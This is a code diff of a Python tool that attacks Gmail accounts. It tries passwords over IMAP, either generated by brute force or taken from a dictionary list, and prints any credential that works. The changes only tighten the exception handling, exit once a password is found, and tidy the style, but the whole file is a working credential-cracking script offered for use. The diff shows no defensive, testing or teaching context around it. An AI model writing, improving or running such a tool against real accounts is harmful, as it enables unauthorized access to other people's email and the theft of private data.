@@ -22,11 +22,12 @@ the only required parameter is EMAIL
 __version__ = '0.01'
 __author__ = 'Youssef Hesham'
 
-import itertools
+import sys
 import imaplib
 from weely import bruteforce
 from parser import Parser
-from helpdoc import gmail_usage, gmail_banner
+from helpdoc import gmail_usage, gmail_banner, gmail_goodbye
+
 
 def _check_s(i, e, p) -> str:
     """
@@ -34,10 +35,11 @@ def _check_s(i, e, p) -> str:
     """
     try:
         i.login(e, p)
-    except:
+    except imaplib.IMAP4.error:
         return None
     else:
         return p
+
 
 def _check_b(i, e, p) -> bool:
     """
@@ -45,10 +47,11 @@ def _check_b(i, e, p) -> bool:
     """
     try:
         i.login(e, p)
-    except:
+    except imaplib.IMAP4.error:
         return False
     else:
         return True
+
 
 def check_gmail_bf(uemail, pwd,
                    start, wwa) -> bool:
@@ -109,6 +112,8 @@ def check_gmail_dt(uemail, pwdlist) -> str:
         print(f"Trying {pwd}")
         if _check_b(i, uemail, pwd):
             print(f"Password Found: {uemail}:{pwd}")
+            sys.exit(0)
+
 
 def main() -> None:
     """
@@ -118,12 +123,12 @@ def main() -> None:
     It will use the bruteforce function in
     weely module
     """
-    parser = Parser('gmail') # initialize arguments
-    if parser.get_email() == None: # Check if the user entered a email to work on
+    parser = Parser('gmail')  # initialize arguments
+    if parser.get_email() is None:
         gmail_banner()
         gmail_usage()
 
-    if parser.get_pwdlist() == None: # BruteForce Attack
+    if parser.get_pwdlist() is None:  # BruteForce Attack
         bruteforce(parser.get_alphabets(),
                    parser.get_output(),
                    parser.get_begin(),
@@ -132,8 +137,8 @@ def main() -> None:
                    api=True,
                    func=check_gmail_bf,
                    func_farg=parser.get_email())
-    else: # Dictionary Attack
-        pwd = check_gmail_dt(parser.get_email(),
+    else:  # Dictionary Attack
+        check_gmail_dt(parser.get_email(),
                        parser.get_pwdlist())
 
 
